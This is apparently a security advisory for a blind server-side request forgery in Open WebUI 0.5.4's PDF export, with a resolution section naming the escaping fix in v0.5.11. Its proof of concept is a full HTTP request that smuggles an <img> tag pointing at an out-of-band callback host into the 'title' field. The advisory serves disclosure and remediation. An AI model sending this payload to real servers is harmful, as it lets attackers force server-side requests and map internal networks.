summary: "Open WebUI vulnerable to blind server side request forgery (SSRF) via the PDF generate\
  \ function\n### Summary\nBlind server side request forgery (SSRF) via the PDF generate function.\
  \ \nThe finding resulted from a penetration test for a customer. It is suspected that the\
  \ root cause of the issue lies within the core of Open WebUI, which is why it is being reported\
  \ as a security issue here. Tested on Open WebUI 0.5.4.\n\n### Details\nIn the PDF export,\
  \ user inputs are interpreted as HTML and embedded into the PDF. According to tests, scripts\
  \ and some potentially dangerous tags (iFrame, Object, etc.) are blocked, preventing server-side\
  \ content from being read through this vulnerability. However, an image tag can be used to\
  \ force a server-side request (SSRF), as shown in the following below.\n\n### PoC\nStart a\
  \ chat and export the PDF:\n![grafik](https://github.com/user-attachments/assets/fbfc898d-b5fd-473f-8f6e-bdc9c7f130b7)\n\
  \nIntercept the request and insert an `<img>` tag into the `title`:\n```http\nPOST /api/v1/utils/pdf\
  \ HTTP/2\nHost: domain.local\n//Some headers removed\nContent-Type: application/json\nContent-Length:\
  \ 541\nTe: trailers\n\n{\"title\":\"<img src='https://d5jok0s7ghl1p77v5brlqlxwmnsega4z.oastify.com'\
  \ />\",\"messages\":[{\"id\":\"81f24589-384d-431c-a26c-5cd3382ac941\",\"parentId\":null,\"\
  childrenIds\":[\"0c1a3ee1-6350-4bb4-b95e-fc2341c47e8e\"],\"role\":\"user\",\"content\":\"\
  hallo\",\"timestamp\":1736932102,\"models\":[\"gpt-4o-POC\"]},{\"parentId\":\"81f24589-384d-431c-a26c-5cd3382ac941\"\
  ,\"id\":\"0c1a3ee1-6350-4bb4-b95e-fc2341c47e8e\",\"childrenIds\":[],\"role\":\"assistant\"\
  ,\"content\":\"Hallo! Wie kann ich Ihnen helfen?\",\"model\":\"gpt-4o-POC\",\"modelName\"\
  :\"gpt-4o-POC\",\"modelIdx\":0,\"userContext\":null,\"timestamp\":1736932103,\"done\":true}]}\n\
  ```\n\nA HTTPS callback was received at https://d5jok0s7ghl1p77v5brlqlxwmnsega4z.oastify.com.\n\
  \n### Impact\nA user can force server-side GET requests. During the available testing time,\
  \ no method was found to read the responses (Blind SSRF). Nonetheless, this should be prevented,\
  \ as an attacker could enumerate internal assets through response delays and trigger arbitrary\
  \ GET requests.\n\n## Resolution\n\nFixed in commit [167c8bf00](https://github.com/open-webui/open-webui/commit/167c8bf00d165af523acfc3b870749f6be6d3e57),\
  \ first released in **v0.5.11** (2025-02). The fix wraps every user-controllable field that\
  \ flows into the PDF HTML template (`title`, `content`, `role`, `model`, formatted date) in\
  \ `html.escape()` before the template f-string is fed to `fpdf2.write_html()`. The PoC payload\
  \ `<img src='...' />` is escaped to `&lt;img src=&#x27;...&#x27; /&gt;` and rendered as literal\
  \ text by fpdf2, with no HTML parsing and no outbound request. Users on `>= 0.5.11` are not\
  \ affected."
